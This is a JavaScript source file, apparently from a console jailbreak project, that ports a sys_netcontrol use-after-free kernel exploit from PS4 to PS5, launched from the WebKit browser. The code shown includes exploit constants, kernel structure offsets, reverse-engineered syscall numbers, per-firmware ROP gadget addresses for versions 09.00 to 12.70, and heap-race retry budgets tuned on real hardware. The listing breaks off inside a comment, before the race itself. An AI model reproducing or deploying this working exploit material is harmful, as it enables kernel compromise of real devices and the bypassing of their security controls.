/* netctrl-ps5.js — sys_netcontrol / Netgraph UAF, PS4 -> PS5, driven from WebKit.
 *
 * Sources:
 *   CSSFontFace-Exploit public/src/netctrl.js  (ntfargo, ufm42) — PS4 JS chain
 *   Luac0re jit_shellcode/poops/poops.c        (Gezine, egycnq) — PS5 semantics
 *   bug: TheFlow's ExploitNetControlImpl
 *
 * Runs on the runtime slopkit2's lapse-runtime.js leaves alive (userland R/W,
 * syscall/call, malloc, thr_new threading), so none of that is re-derived here.
 *
 * ---------------------------------------------------------------------------
 * WHAT ACTUALLY DIFFERS PS4 -> PS5  (each marked [PS5] at its use site)
 *
 *  1. sys_netcontrol signature. THE one that sinks a naive port:
 *        PS4:  netcontrol(sock, event)
 *        PS5:  netcontrol(slot, event, buf, buflen)   fd lives IN buf, len 8
 *     and the slot returned by SET_QUEUE must be reused for CLEAR_QUEUE.
 *     -1 asks the kernel to pick; if that fails, slot 1 is retried.
 *  2. rthdr aliasing scan is tagged. PS4 wrote a bare index at +0x04 and
 *     compared it; PS5 writes RTHDR_TAG|i and validates the high half, which
 *     rejects the garbage a bare-index compare happily accepts.
 *  3. Struct offsets: KQ_FDP 0x98 -> 0xA8, ROOTVNODE 0x8, UCRED_SIZE 0x168,
 *     IPV6_SOCK_NUM 0x100 -> 80.
 *  4. kqueue leak needs kq_fdp != 0 as well as the 0x1430000 header magic;
 *     the header alone yields false positives on PS5.
 *  5. No kernel-base arithmetic. PS4 derived base from kl_lock - KL_LOCK.
 *     PS5 finds curproc through a pipe's SIGIO owner and walks allproc, so no
 *     per-firmware kernel-base constant is needed at all.
 *  6. All rthdrs are freed across every socket before the race is triggered.
 *  7. Threads: Web Workers -> native threads (see THREADS below).
 *
 * THREADS. netctrl.js drives four iov + four uio Web Workers, each of which
 * re-establishes its OWN arbitrary R/W (arw.master / arw.leak). That cannot be
 * carried over: slopkit's primitives are JSC cells owned by the page, and a
 * Worker gets a fresh context that cannot touch them. poops.c uses native
 * threads sharing the address space instead, which is both correct and already
 * available here — lapse-runtime spawns exactly such a thread for aioshellcode
 * via thr_new(start_func = shellcode_entry). The worker bodies only ever sit in
 * a blocking recvmsg/readv on a socketpair; they need no R/W of their own.
 *
 * OFFSETS AND SYSCALL NUMBERS ARE RE'd FROM THE DECRYPTED RETAIL KERNELS, not
 * inherited from the reference sources: syscall numbers out of syscallnames[],
 * the filedesc layout out of change_root(). Both verified identical across
 * 09.00-12.00. Scripts: E:\ps5\dwarf\NETCTRL_RE\.
 *
 * STILL NOT RUN ON HARDWARE. The constants are checked, the race is not — a
 * lost race reports ERR_TRIPLE_FREE / ERR_LEAK_KQUEUE, but a wrong assumption
 * about timing or heap state can still panic.
 */
"use strict";

(function () {

/* ------------------------------------------------------------- constants */

const UCRED_SIZE     = 0x168;   // poops.c:38   [PS5]
/* 150, matching Poops.java (BD-JB5 2.0) - the PS5 reference. This was 80 here,
 * a performance concession that directly halves spray coverage and therefore
 * the chance of landing an alias. Correctness over speed: a race that cannot
 * win is worse than a slow one. */
const IPV6_SOCK_NUM  = 150;     // Poops.java:66 [PS5]
const IOV_THREAD_NUM = 4;       // poops.c:46
const UIO_THREAD_NUM = 4;       // poops.c:47
const MSG_IOV_NUM    = 0x17;    // poops.c:43
const UIO_IOV_NUM    = 0x14;    // poops.c:42
const MSG_HDR_SIZE   = 0x30;    // poops.c:36
const PIPEBUF_SIZE   = 0x18;    // poops.c:35
const PAGE_SIZE      = 0x4000;  // poops.c:40
const RTHDR_TAG      = 0x13370000;      // poops.c:39  [PS5]
const SYSCORE_AUTHID = 0x4800000000000007n;  // poops.c:58

const KQ_FDP_OFFSET     = 0xA8n;  // poops.c:75  [PS5] (PS4: 0x98)
const PIPE_SIGIO_OFFSET = 0xD8n;  // poops.c:76
const IN6P_OUTPUTOPTS_OFFSET = 0x120n;   // inpcb -> in6p_outputopts
/* ip6po_rhi_rthdr. Upstream says 0x70 and our own RE agrees independently:
 * ip6_clearpktopts (0xFFFFFFFF80863ED0) case 51 frees *(ip6po + 112). */
const IP6PO_RHI_RTHDR_OFFSET = 0x70n;
// Confirmed against the kernels themselves, not inherited. change_root() on
// 10.00 reads/writes the filedesc as:
//     mov r15, [r12 + 0x10]      oldvp = fdp->fd_rdir
//     mov [r12 + 0x10], r14      fdp->fd_rdir = vp
//     cmp qword [r12 + 0x18], 0  if (fdp->fd_jdir == NULL)
//     mov [r12 + 0x18], r14      fdp->fd_jdir = vp
// so PS5 lays it out fd_files +0x00, fd_cdir +0x08, fd_rdir +0x10,
// fd_jdir +0x18 — shifted 8 from stock FreeBSD 11, which has fd_map at +0x08.
// Verified on 09.00 09.20 09.40 09.60 10.00 10.01 10.20 10.40 11.00 11.20
// 11.40 11.60 12.00.  see E:\ps5\dwarf\NETCTRL_RE\verify_fd.py
//
// Reading the KERNEL proc's filedesc at +0x08 therefore yields its fd_cdir,
// which for pid 0 is the root vnode — which is what this offset is for.
const ROOTVNODE_OFFSET  = 0x8n;   // poops.c:79  [PS5] — confirmed
const FILEDESCENT_SIZE  = 0x30n;  // poops.c:74
const FDT_OFILES_OFFSET = 0x8n;   // poops.c:80
const KERNEL_PID        = 0;      // poops.c:57
const FIOSETOWN         = 0x8004667Cn;  // poops.c:60

const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51, IPV6_RTHDR_TYPE_0 = 0;
const RTP_SET = 1, RTP_PRIO_REALTIME = 2;
/* Realtime priority VALUE. Not 0 - that silently fails.
 *
 * rtp_to_pri (0xFFFFFFFF806D8A40, byte-identical devkit/retail 10.00), case 2
 * == RTP_PRIO_REALTIME:
 *
 *     if ( (unsigned __int16)(prio - 768) <= 0xFDFFu ) {   // prio NOT in 256..767
 *         if ( !sceSblACMgrHasCap(cred) ) return 22;       // EINVAL
 *         ...
 *     }
 *
 * The wrap-around compare is false exactly for prio in [256, 767], so that is
 * the range an unprivileged thread may request. This port previously asked for
 * prio 0, which is outside it and therefore needs a capability we do not hold
 * until AFTER the jailbreak - so the call returned EINVAL and the thread never
 * got realtime priority at all. The return value was discarded, so it looked
 * like it worked. Upstream Poops uses 256 for exactly this reason.
 */
const RTP_PRIO_VALUE = 256;

// Pin to one core before promoting priority, as upstream does. An unpinned
// realtime thread migrates and the triple-free window is still lost.
// Poops.java:51-73.
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1, CPU_SET_SIZE = 0x10;
const MAIN_CORE = 5;
const UIO_SYSSPACE = 1, UIO_READ = 0, UIO_WRITE = 1;
const FIONBIO = 0x8004667En;    // _IOW('f', 126, int)
/* kern_recvit tests `flags & 0x4080` and returns 35 (EWOULDBLOCK) rather than
 * sleeping, so 0x80 is honoured on this kernel. */
const MSG_DONTWAIT = 0x80;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;     // poops.c:16-18
const COMMAND_UIO_READ = 0, COMMAND_UIO_WRITE = 1; // poops.c:49-50

const NET_CONTROL_NETEVENT_SET_QUEUE   = 0x20000003;  // poops.c:71
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;  // poops.c:72

// Retry budgets. poops.c uses 5000 for the alias scans because native code
// spins them cheaply; from JS each round is far more expensive, so these are
// the first knobs to turn if the scans time out rather than fail outright.
/* 512, not upstream's 5000 - and this is a SAFETY bound, not tuning.
 *
 * Measured over 45 console runs: every panic happened while grinding
 * find_twins, and not one happened after twins were found. Once the ucred is
 * double-freed we are spraying rthdr bytes over a live credential, so any
 * credential check that lands on it faults the kernel. Upstream clears this
 * stage in ~7 s; at 0.215 ms/syscall (~40x native) 5000 rounds is ~5.4 min of
 * exposure, which is simply running the panic clock.
 *
 * The same data shows the stage is bimodal - twins are found quickly or not at
 * all - so a smaller budget costs few real wins and converts 5-minute panics
 * into ~35-second clean throws. Eight fast attempts beat one slow one when a
 * panic costs a reboot either way. */
const TWIN_ATTEMPTS    = 512;    // 512 is correct for US. Tried 5000 (upstream)
// 2026-08-08 and MEASURED: a self=all run stays PERFECT self through round 2048
// (307,200 frees, ZERO cross-overlap ever) -> self=all is a STUCK state, not
// slow convergence. The freebucket-flush hypothesis is refuted; more rounds
// never surface the chunk. Winnable runs land under round 256 (bimodal: fast or
// never), so 512 catches every winnable run and fails a stuck one in ~55s
// instead of ~9min. (Upstream BD-J uses 5000, likely because BD-J heap flushes
// differently; on the WebKit chain it does not.)
/* 5000 - upstream's value, restored. I cut this to 512 and then 2048 on my own
 * reasoning about convergence; both were wrong and cost runs that upstream
 * would have won (triplet[1] exhausted 2048 on a run where nothing else was
 * broken). find_triplet inspects ONE socket per attempt where find_twins
 * inspects all 150, so it legitimately needs a big budget.
 * Cost at ~0.25 ms/syscall: ~190 s worst case per call. Runs get longer, but
 * reaching the stage we are actually debugging matters more than failing
 * quickly - we already have the diagnostics we wanted from the fast failures. */
const TRIPLET_ATTEMPTS = 5000;
/* 10000, matching Poops.java's leakKqueue() (`while (attempts < 10000)`).
 * This was 0x200 = 512 - twenty times short of the reference. */
const KQUEUE_ATTEMPTS  = 10000;
/* cr_refcnt reset: how many sendmsg allocate-write-free cycles to run between
 * CLEAR_QUEUE and the double-free close. 0x80 is upstream's value (poops does
 * exactly this loop). Was previously 32 rounds of iov WORKER sprays, which
 * could not write cr_refcnt at all because those threads are unpinned and so
 * allocate from a different core's UMA bucket than the one the ucred was freed
 * into — see ucred_triple_free for the full reasoning. */
const REFCNT_SENDMSG_N = 0x80;
// poops.c spins these unbounded (`while (1)`). Bounded here so a lost race
// reports instead of hanging the browser tab forever.
/* Upstream runs BOTH of these as `while (true)` - unbounded. We keep a bound
 * only so a broken primitive cannot hang the run forever, but 0x200 was far
 * too tight: the reclaim would be abandoned while still converging, and the
 * caller then spent a kread_slow RETRY, which is destructive (each retry frees
 * rthdrs and re-acquires triplets, so the aliasing degrades). Observed as
 * "no worker received the read" x2 then "uio reclaim did not converge" x6 -
 * the state getting worse with every outer attempt.
 * ~2.5 ms per round, so 0x2000 is ~20 s worst case. Spend the effort INSIDE
 * the reclaim, where it is free, not outside it where it costs state.
 * RAISED 0x2000 -> 0x4000 (2026-08-08): both landed runs died in make_karw's
 * slow-read bootstrap ("vrd never returned a kernel pointer") - the uio reclaim
 * still was not converging within 0x2000 on this hardware, and the 3 outer
 * KRW_slow_ptr retries then eroded the aliasing. Per the note above + line ~883
 * ("budgets may need raising on hardware"), give the reclaim more rounds INSIDE
 * the loop. ~40 s worst case per slow read; usually converges at round 0. */
const UIO_SPRAY_ROUNDS = 0x4000;
const IOV_SPRAY_ROUNDS = 0x4000;

/* --------------------------------------------------------- runtime binding */

// Bound lazily, NOT at load. Throwing at module scope killed the IIFE before
// window.netctrl_ps5 was ever assigned, so a console without slopkit loaded got
// a bare "undefined" with nothing to inspect — no preflight, no version, no way
// to tell a missing runtime apart from a script that failed to parse.
const R = {
    ready: false,
    // Same trace rule as bindRuntime() applies BEFORE binding, so the very
    // first line of run() is beaconed too rather than going only to the screen.
    log: (window.NETCTRL_TRACE && window.slopkit && window.slopkit.mark)
        ? function (m) { window.slopkit.mark("NC " + m); }
        : ((window.slopkit && window.slopkit.screenLine) || console.log.bind(console)),
};

function bindRuntime() {
    if (R.ready) return true;
    /* syscall/malloc deliberately NOT required: both lead to runChain, which
       is fatal on 10.00. Syscalls go through rop_worker.syscallSync and memory
       comes from get_backing_store. */
    const need = ["read64", "write64", "read32", "write32", "get_backing_store"];
    const missing = need.filter(n => typeof window[n] === "undefined");
    if (missing.length)
        throw new Error("netctrl-ps5: runtime missing " + missing.join(", ") +
                        " — load slopkit2's lapse.html / lapse-runtime.js first");
    R.rd64 = window.read64;  R.wr64 = window.write64;
    R.rd32 = window.read32;  R.wr32 = window.write32;
    R.syscall = window.syscall;
    R.malloc = window.malloc;
    R.SYS = window.SYSCALL;
    /* Stage lines go to the console screen by default. With
     * window.NETCTRL_TRACE set they ALSO go out as beacons through
     * slopkit.mark(), which uses a SYNCHRONOUS XHR - so the last line that
     * reaches the host is exactly where execution stopped.
     *
     * That is the only way to localise a failure that kills the renderer
     * outright: the armed run died somewhere inside run() with neither
     * NETCTRL-RUN nor NETCTRL-THREW reported, because the catch block never
     * got to execute. Screen-only logging is invisible from here.
     *
     * Opt-in, not always on: a blocking HTTP round trip between stages
     * perturbs the timing of a race this is meant to observe.
     */
    const scr = (window.slopkit && window.slopkit.screenLine) ||
                console.log.bind(console);
    const beacon = window.slopkit && window.slopkit.mark;
    R.log = (window.NETCTRL_TRACE && beacon)
        ? function (m) { try { beacon("NC " + m); } catch (e) { scr(m); } }
        : scr;
    R.ready = true;
    return true;
}

// What is present without throwing — lets the harness report the gap.
/* Primitives preflight will demand that we cannot currently reach.
 *
 * Shared by preflight() and runtimeStatus() on purpose. They used to test
 * different things - status only checked window globals - so on 10.00 the
 * console beaconed ready=1&missing=none and then threw `unreachable -> pipe`
 * from preflight a moment later. A readiness report that can contradict the
 * very next step is worse than no report.
 *
 * Safe to call before bindRuntime()/SYM.attach(): anything that cannot be
 * PROVEN reachable counts as a gap rather than throwing.
 */
function syscallGaps() {
    /* There are no fallbacks any more - invoke() only accepts an RE'd number,
       because both former fallbacks (R.SYS via window.syscall, and SYM via
       window.call) route through the fatal runChain. So a gap is simply a
       primitive with no verified syscall number. Also report the runner
       itself, since without it nothing can be issued at all. */
    const gaps = Object.keys(SYSFALLBACK)
        .filter((n) => SYSCALL_NUMS[n] === undefined);
    const rw = window.rop_worker;
    if (!rw || typeof rw.syscallSync !== "function") gaps.push("rop_worker");
    return gaps;
}

function runtimeStatus() {
    // spawn_thread is deliberately NOT required: this port builds its own
    // thr_new chain rather than using lapse.js's libc-dependent one.
    /* syscall/malloc are NOT required and must not be used: both route to
       lapse-runtime's runChain, which kills the renderer on 10.00. */
    const need = ["read64", "write64", "read32", "write32",
                  "get_backing_store", "slopkit"];
    const have = need.filter(n => typeof window[n] !== "undefined");
    const sk = window.slopkit || {};
    const fw = String(sk.FW_VERSION || "");
    const gaps = syscallGaps();
    return {
        ready: have.length === need.length && !!GADGETS[fw] &&
               !!sk.webkitBase && !!sk.kernelBase && gaps.length === 0,
        have: have,
        missing: need.filter(n => typeof window[n] === "undefined"),
        // what preflight would reject on, reported BEFORE claiming ready
        syscall_gaps: gaps,
        syscalls_known: Object.keys(SYSCALL_NUMS).length,
        fw: fw || "?",
        gadgets: GADGETS[fw] ? Object.keys(GADGETS[fw]).length : 0,
        webkit_base: sk.webkitBase ? "0x" + BigInt(sk.webkitBase).toString(16) : "none",
        kernel_base: sk.kernelBase ? "0x" + BigInt(sk.kernelBase).toString(16) : "none",
        needs_libc: false,
    };
}

function log(m) { R.log("[netctrl] " + m); }
function hex(v) { return "0x" + BigInt(v).toString(16); }
const S = (n) => BigInt(n);

/* --------------------------------------------------------------- byte I/O */

function wr8(base, off, v) {
    const a = BigInt(base) + BigInt(off);
    const w = R.rd64(a & ~7n);
    const sh = BigInt(Number(a & 7n) * 8);
    R.wr64(a & ~7n, (w & ~(0xFFn << sh)) | (BigInt(v) & 0xFFn) << sh);
}
function rd8(base, off) {
    const a = BigInt(base) + BigInt(off);
    return Number((R.rd64(a & ~7n) >> BigInt(Number(a & 7n) * 8)) & 0xFFn);
}
function wr32at(base, off, v) { R.wr32(BigInt(base) + BigInt(off), Number(v) >>> 0); }
/* window.read32 returns a BigInt (it accumulates `x |= BigInt(view[i]) << ...`),
 * so `>>> 0` on its result throws "BigInt does not support >>> operator" - which
 * is exactly what the first armed run hit. Every caller here compares against
 * plain numbers (=== 1, === UIO_IOV_NUM, & 0xFFFF0000), so normalise to Number
 * once, here, rather than at each site. */
function rd32at(base, off) {
    return Number(R.rd32(BigInt(base) + BigInt(off))) >>> 0;
}
function wr64at(base, off, v) { R.wr64(BigInt(base) + BigInt(off), BigInt(v)); }
function rd64at(base, off) { return R.rd64(BigInt(base) + BigInt(off)); }

/* Allocator. Deliberately NOT window.malloc.
 *
 * lapse-runtime's malloc serves the first 248 bytes from its arena and then
 * falls into a slab path that issues an mmap syscall through runChain - the
 * fatal path. init() alone asks for ~300 KB (tmp 0x4000, plus 8 thread slots
 * of stack+chain), so almost every allocation here would take it.
 *
 * mmap cannot be reached through our chain either: it needs 6 arguments and
 * there is no `pop r9` gadget anywhere in libSceNKWebKit or libkernel_web
 * (byte-scanned for 41 59 C3 - lapse-runtime's comment about this is correct),
 * so only rdi/rsi/rdx/rcx/r8 can be set.
 *
 * So allocate in JS and take the address of the backing store. Uint8Array
 * memory is ordinary writable process memory, get_backing_store() hands back
 * its raw m_vector, and no syscall is involved at all. The array is retained in
 * `keep` so GC cannot move or free it underneath the kernel. */
const mem = {
    alloc(size) {
        /* Delegated to rop-worker's bump allocator over the bottom of the
         * Worker's 0x80000 stack. Every other route is unavailable on 10.00:
         * window.malloc's slab path issues mmap through the fatal runChain;
         * get_backing_store needs an addrof that cannot bootstrap in our flow
         * (the armed run threw exactly that); and mmap itself is 6-arg with no
         * usable `pop r9` gadget in either module. The worker's stack is
         * already mapped, writable, and at an address we know. */
        const rw = window.rop_worker;
        if (!rw || typeof rw.alloc !== "function")
            throw new Error("netctrl-ps5: rop_worker.alloc missing");
        return rw.alloc(size);
    },
    bset(p, n, v) { for (let i = 0; i < n; i++) wr8(p, i, v); },
};

/* -------------------------------------------------------------- syscalls */

// Both reference implementations call libkernel WRAPPERS resolved by symbol,
// not raw syscall numbers: poops.c resolves fn_netcontrol via
// dlsym(LIBKERNEL_HANDLE 0x2001), and netctrl.js builds `const fn = {}` the
// same way. That matters here because slopkit's SYSCALL table only carries what
// Y2JB's lapse needed — read/write/close/getpid/socket/{get,set}sockopt, plus
// pipe/socketpair/sched_yield/rtprio_thread/thr_new added by lapse.js. Eight of
// the calls below are absent from it, netcontrol included.
//
// Guessing those numbers would be the wrong fix: a wrong syscall number in a
// kernel UAF panics rather than erroring. So each call resolves a symbol first
// and only falls back to a runtime-provided number when one genuinely exists.
const SYM = {
    cache: new Map(),
    resolver: null,          // set by attach(); (name) -> address|0n

    attach() {
        const sk = window.slopkit || {};
        if (typeof window.dlsym === "function")      this.resolver = window.dlsym;
        else if (typeof sk.dlsym === "function")     this.resolver = sk.dlsym.bind(sk);
        else if (typeof window.resolve === "function") this.resolver = window.resolve;
    },

    get(name) {
        if (this.cache.has(name)) return this.cache.get(name);
        let a = 0n;
        if (this.resolver) { try { a = BigInt(this.resolver(name) || 0); } catch (e) { a = 0n; } }
        this.cache.set(name, a);
        return a;
    },
};

// Recovered from the decrypted retail kernels, not guessed. The kernel keeps
// syscallnames[] (the array FreeBSD uses for ktrace/audit), so each number was
// read straight out of it; the array was located by anchoring on entries whose
// numbers are already known and rejecting any candidate that failed to
// reproduce all twelve of them.
//
// netcontrol is the one that mattered: it is Sony's, sitting in a slot stock
// FreeBSD leaves obsolete (99 is oaccept upstream), so no public reference
// would have settled it.
//
// Verified identical across 09.00 09.20 09.40 09.60 10.00 10.01 10.20 10.40
// 11.00 11.20 11.40 11.60 12.00 — the whole supported window — so one table
// covers every firmware this chain can run on.
//   see E:\ps5\dwarf\NETCTRL_RE\syscalls.py
const SYSCALL_NUMS = {
    mprotect: 74n, sendmsg: 28n, read: 3n, write: 4n, close: 6n, getpid: 20n, setuid: 23n, recvmsg: 27n,
    // getuid (24, confirmed in syscallnames[] on kernel_1000 and kernel_1200):
    // reported alongside setuid so a privilege failure names itself instead of
    // surfacing 512 rounds later as an unexplained self=all.
    getuid: 24n,
    open: 5n, sys_dynlib_dlsym: 591n,
    dup: 41n, ioctl: 54n, munmap: 73n, socket: 97n, netcontrol: 99n,
    setsockopt: 105n, getsockopt: 118n, readv: 120n, writev: 121n,
    socketpair: 135n, sched_yield: 331n, kqueue: 362n, thr_exit: 431n,
    thr_self: 432n, thr_new: 455n, rtprio_thread: 466n, mmap: 477n,
    cpuset_setaffinity: 488n,
    /* jitshm is how PS5 hands out executable memory without a W^X violation:
     * create returns an exec-capable handle, alias returns a second handle to
     * the same physical pages with different protections. Both numbers read out
     * of syscallnames[] in kernel_1000 and kernel_1200 — identical, and the
     * whole 9.00-12.00 window shares those two builds' tables. */
    jitshm_create: 533n, jitshm_alias: 534n,
    /* p2jb (12.02+) only. Both read out of syscallnames[] in kernel_1202 /
     * 1220 / 1240 / 1260 / 1270 — identical across all five.
     *   kqueueex(flags)  141 — the cred leak. sys_kqueueex crhold()s
     *     td_ucred into kq->kq_cred (+0xF0) BEFORE it looks at the flags
     *     argument, and the non-zero-flags path then errors out without ever
     *     crfree()ing it. One leaked cr_ref per call; that is the whole bug.
     *   poll(fds, nfds, timeout) 209 — the cr_refcnt reset spray, standing in
     *     for netcontrol's sendmsg. nfds = UCRED_SIZE/8 = 45 makes sys_poll
     *     allocate exactly 45*8 = 0x168 bytes, the ucred bucket, and copy the
     *     caller's buffer into it (first u32 = 1 lands on cr_refcnt). */
    kqueueex: 141n, poll: 209n,
    // There is no `pipe` in this kernel's syscallnames[] at all - Sony dropped
    // the arg-less form the way FreeBSD 10 did, leaving only pipe2(fildes,
    // flags), num 687 narg 2. Upstream poops gets away with the name "pipe"
    // because it dlsym's libkernel's wrapper; this port issues raw syscalls and
    // libc never resolves on 10.00, so it has to know the number itself.
    pipe2: 687n,
};

// ROP gadgets, verified by disassembling each RVA in the real modules for every
// firmware in the supported window. Deliberately NOT taken from slopkit's
// lapse-offsets.json: that table also carries setjmp/longjmp entries pointing
// at data rather than code, and the runtime's threading path dies on them. The
// chain below never touches libc, so none of that matters here.
//   syscall_wrapper lives in libkernel_web; everything else in libSceNKWebKit.
//   see E:\ps5\dwarf\NETCTRL_RE\webkit_gadgets.py
//
// EXTENDED 09.00..12.00 — the full netcontrol window. The eight new rows
// (10.20 10.40 10.60 11.00 11.20 11.40 11.60 12.00) came out of the retail
// libSceNKWebKit.sprx / libkernel_web.sprx in the system_ex database by the
// same rule the six hand-made rows already followed: take the FIRST occurrence
// of the gadget's byte pattern inside the module's executable PT_LOAD. That
// rule was not assumed — it was checked first, and it reproduces all 54
// pre-existing 09.00/09.20/09.40/09.60/10.00/10.01 values byte for byte, which
// is what makes the new rows trustworthy. Every RVA below was then disassembled
// and string-compared against the gadget it claims to be (182 gadgets, zero
// mismatches), so none of these is a pattern that happens to sit in a data pool.
//
// 10.20/10.40/10.60 being identical to 10.00 and 11.40/11.60 identical to 11.20
// is real, not a copy-paste: those builds ship the same WebKit binary, and
// offsets.json's independent hc/gd anchors group them the same way.
const GADGETS = {
    "09.00": { mov_rsp_rbp: 0x2b1bbcan, pivot_rdi_rsp: 0x2b1bdaen, pop_r8: 0x1d1992fn,
               pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x17324dn,
               pop_rdx: 0xea62n, pop_rsi: 0x30c9en, syscall_wrapper: 0x1a357n },
    "09.20": { mov_rsp_rbp: 0x2b1bbaan, pivot_rdi_rsp: 0x2b1bd8en, pop_r8: 0x1d1990fn,
               pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x8b61dn,
               pop_rdx: 0x16e8ean, pop_rsi: 0x30c9en, syscall_wrapper: 0x1a357n },
    "09.40": { mov_rsp_rbp: 0x2b1bf5an, pivot_rdi_rsp: 0x2b1c13en, pop_r8: 0x1d19b6fn,
               pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x8b61dn,
               pop_rdx: 0x65770n, pop_rsi: 0x30c9en, syscall_wrapper: 0x1a357n },
    "09.60": { mov_rsp_rbp: 0x2b1bf5an, pivot_rdi_rsp: 0x2b1c13en, pop_r8: 0x1d19b6fn,
               pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x8b61dn,
               pop_rdx: 0x65770n, pop_rsi: 0x30c9en, syscall_wrapper: 0x1a357n },
    "10.00": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
    "10.01": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
    "10.20": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
    "10.40": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
    "10.60": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
    "11.00": { mov_rsp_rbp: 0x2c56fean, pivot_rdi_rsp: 0x2c571cen, pop_r8: 0x1d8488fn,
               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x1b46d9n,
               pop_rdx: 0x10f32n, pop_rsi: 0x67b64n, syscall_wrapper: 0x1a8d7n },
    "11.20": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
    "11.40": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
    "11.60": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
    "12.00": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
    "12.02": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
    "12.20": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
    "12.40": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
    "12.60": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
    "12.70": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
};

// Runtime keys to fall back on when a number is missing. `pipe` used to be
// listed here on the assumption lapse.js would publish it - on 10.00 it does
// not, and SYM can't help because libc never resolves on that firmware, so the
// chain ran out of rungs and preflight threw `unreachable -> pipe`. pipe2 now
// has an RE'd number, and this entry is only a secondary route.
const SYSFALLBACK = {
    read: "read", write: "write", close: "close", getpid: "getpid",
    socket: "socket", setsockopt: "setsockopt", getsockopt: "getsockopt",
    pipe2: "pipe2", socketpair: "socketpair", sched_yield: "sched_yield",
    rtprio_thread: "rtprio_thread",
    dup: null, ioctl: null, kqueue: null, setuid: null,
    readv: null, writev: null, recvmsg: null, netcontrol: null,
    // elfldr-only, and only reached long after the race; RE'd numbers, no
    // libc name to fall back to (nothing resolves libc on this chain anyway)
    jitshm_create: null, jitshm_alias: null,
};

/* Every syscall goes through rop-worker's SYNCHRONOUS path.
 *
 * lapse-runtime's runChain is fatal on 10.00 - getpid(), zero arguments, kills
 * the renderer exactly like a 5-arg syscall, because it pivots RSP on the
 * MAIN thread and then "returns" via `mov rsp,rbp` into whatever frame RBP
 * described inside ICU's collator compare. window.syscall AND window.call both
 * route through it, so neither may be used here.
